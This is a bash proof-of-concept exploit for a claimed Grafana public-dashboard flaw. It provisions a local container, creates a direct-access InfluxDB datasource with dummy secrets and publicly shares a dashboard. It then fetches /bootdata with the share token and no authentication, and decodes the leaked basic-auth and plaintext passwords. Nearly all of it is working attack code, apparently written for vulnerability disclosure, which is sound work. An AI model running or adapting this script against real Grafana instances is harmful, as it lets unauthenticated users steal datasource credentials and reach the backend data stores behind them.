#!/usr/bin/env bash
# H3: Public Dashboard DS_ACCESS_DIRECT Credential Exposure
# PoC — provisions environment, creates vulnerable config, and extracts credentials
# as an unauthenticated attacker
#
# Vulnerability path (frontendsettings.go:541-577):
#   GET /bootdata/:accessToken  (no auth required — public dashboard viewer endpoint)
#     SetPublicDashboardAccessToken middleware: c.PublicDashboardAccessToken = :accessToken
#     GetBootdata -> setIndexViewData -> getFrontendSettings -> getFSDataSources
#       Line 476: c.IsPublicDashboardView() == true  -> publicDashFilterUsedDataSources
#       Line 541: if ds.Access == datasources.DS_ACCESS_DIRECT {   <- NO IsPublicDashboard guard
#         Line 542-552: DecryptedBasicAuthPassword -> dsDTO.BasicAuth (base64 user:pass)
#         Line 568-576: DecryptedPassword          -> dsDTO.Password  (plaintext)
#       }  <- decrypted credentials returned in JSON to unauthenticated caller
#
# Confirmed on: grafana/grafana:12.4.2 (latest as of 2026-04-11)
# Also affects: current HEAD (13.1.0-pre)

set -euo pipefail

GRAFANA_PORT="${GRAFANA_PORT:-13002}"
GRAFANA_IMAGE="${GRAFANA_IMAGE:-grafana/grafana:latest}"
CONTAINER_NAME="h3-grafana-poc"
GRAFANA_URL="http://localhost:${GRAFANA_PORT}"
ADMIN_AUTH="admin:admin"
EVIDENCE_DIR="$(cd "$(dirname "$0")" && pwd)/evidence"
mkdir -p "$EVIDENCE_DIR"

echo "=== H3 PoC: DS_ACCESS_DIRECT credential exposure via /bootdata ==="
echo "    Target: $GRAFANA_IMAGE on port $GRAFANA_PORT"
echo ""

# ── Provision ──────────────────────────────────────────────────────────────────
echo "[env] Starting Grafana container..."
docker rm -f "$CONTAINER_NAME" 2>/dev/null || true
docker run -d \
  --name "$CONTAINER_NAME" \
  -p "${GRAFANA_PORT}:3000" \
  -e "GF_SECURITY_ADMIN_PASSWORD=admin" \
  "$GRAFANA_IMAGE"

echo "[env] Waiting for Grafana..."
for i in $(seq 1 30); do
  if curl -sf "${GRAFANA_URL}/api/health" >/dev/null 2>&1; then
    GRAFANA_VERSION=$(curl -sf "${GRAFANA_URL}/api/health" | python3 -c "import sys,json; print(json.load(sys.stdin)['version'])")
    echo "[env] Grafana $GRAFANA_VERSION ready."
    break
  fi
  sleep 2
done
echo ""

# ── 1. Create direct-access datasource with BasicAuth + InfluxDB password ─────
echo "[1/5] Creating direct-access datasource (type=influxdb, access=direct)..."
DS_RESP=$(curl -sf -X POST "${GRAFANA_URL}/api/datasources" \
  -u "$ADMIN_AUTH" \
  -H "Content-Type: application/json" \
  -d '{
    "name":          "h3-poc-influx-direct",
    "type":          "influxdb",
    "access":        "direct",
    "url":           "http://influxdb.internal:8086",
    "database":      "metrics_db",
    "user":          "influx_ro_user",
    "basicAuth":     true,
    "basicAuthUser": "basicauth_user",
    "secureJsonData": {
      "basicAuthPassword": "S3cr3tB4s1cP4ss!",
      "password":          "Infl0xPl4intextP4ss!"
    }
  }')
DS_UID=$(echo "$DS_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['datasource']['uid'])")
echo "    Datasource UID: $DS_UID (access=direct, BasicAuth+Password stored encrypted)"
echo ""

# ── 2. Create a dashboard referencing the datasource ──────────────────────────
echo "[2/5] Creating dashboard referencing the direct-access datasource..."
DASH_RESP=$(curl -sf -X POST "${GRAFANA_URL}/api/dashboards/db" \
  -u "$ADMIN_AUTH" \
  -H "Content-Type: application/json" \
  -d "{
    \"dashboard\": {
      \"title\": \"H3 PoC Dashboard\",
      \"panels\": [{
        \"id\": 1, \"type\": \"timeseries\", \"title\": \"Metrics\",
        \"datasource\": {\"type\": \"influxdb\", \"uid\": \"${DS_UID}\"},
        \"targets\": [{\"refId\": \"A\", \"datasource\": {\"uid\": \"${DS_UID}\"}}]
      }],
      \"schemaVersion\": 36
    },
    \"overwrite\": true,
    \"folderId\": 0
  }")
DASH_UID=$(echo "$DASH_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['uid'])")
echo "    Dashboard UID: $DASH_UID"
echo ""

# ── 3. Enable public sharing (simulates admin sharing dashboard externally) ────
echo "[3/5] Enabling public sharing for dashboard..."
PUB_RESP=$(curl -sf -X POST "${GRAFANA_URL}/api/dashboards/uid/${DASH_UID}/public-dashboards" \
  -u "$ADMIN_AUTH" \
  -H "Content-Type: application/json" \
  -d '{"isEnabled": true, "share": "public"}')
ACCESS_TOKEN=$(echo "$PUB_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['accessToken'])")
echo "    Public access token : $ACCESS_TOKEN"
echo "    Share URL           : ${GRAFANA_URL}/public-dashboards/${ACCESS_TOKEN}"
echo "    (This token is visible to any browser visiting the share URL)"
echo ""

# ── 4. Attacker calls /bootdata/:accessToken — zero authentication ─────────────
echo "[4/5] Attacker (unauthenticated) calls /bootdata/:accessToken..."
echo "    GET ${GRAFANA_URL}/bootdata/${ACCESS_TOKEN}"
echo "    Authorization: NONE"
echo "    Cookies: NONE"
echo ""

BOOTDATA_RESP=$(curl -sf \
  "${GRAFANA_URL}/bootdata/${ACCESS_TOKEN}" \
  -H "Accept: application/json")

# Save raw response as evidence
echo "$BOOTDATA_RESP" > "${EVIDENCE_DIR}/bootdata_response.json"
echo "    Raw response: evidence/bootdata_response.json"
echo ""

# ── 5. Extract credentials from the unauthenticated response ──────────────────
echo "[5/5] Extracting credentials from unauthenticated bootdata response..."
echo ""

python3 - "${EVIDENCE_DIR}/bootdata_response.json" <<'PYEOF'
import sys, json, base64

with open(sys.argv[1]) as f:
    data = json.load(f)

settings    = data.get("settings", {})
datasources = settings.get("datasources", {})

print(f"Datasources returned to unauthenticated caller: {len(datasources)}")
print()

leaked = 0
for name, ds in datasources.items():
    basic_auth = ds.get("basicAuth", "")
    password   = ds.get("password", "")
    username   = ds.get("username", "")
    access     = ds.get("access", "")
    url        = ds.get("url", "")

    if not (basic_auth or password):
        continue

    leaked += 1
    print(f"  [CREDENTIAL LEAK] datasource: {name!r}")
    print(f"    access mode : {access}")
    print(f"    backend url : {url}")

    if basic_auth:
        encoded = basic_auth.split(" ", 1)[-1] if " " in basic_auth else basic_auth
        try:
            decoded = base64.b64decode(encoded).decode()
            print(f"    basicAuth header  : {basic_auth}")
            print(f"    basicAuth decoded : {decoded}   <-- user:pass EXPOSED")
        except Exception:
            print(f"    basicAuth (raw)   : {basic_auth}")

    if username:
        print(f"    InfluxDB user     : {username}")
    if password:
        print(f"    InfluxDB password : {password}   <-- PLAINTEXT CREDENTIAL EXPOSED")
    print()

if leaked == 0:
    print("No credentials found. Check evidence/bootdata_response.json.")
    sys.exit(1)

print(f"RESULT: {leaked} datasource(s) exposed credentials to unauthenticated caller.")
print()
print("Attack path:")
print("  Any internet user with the public dashboard URL can extract decrypted")
print("  datasource credentials and use them to access the backend data store")
print("  directly, bypassing Grafana entirely.")
PYEOF

echo ""
echo "=== PoC Complete. Evidence in: $EVIDENCE_DIR ==="
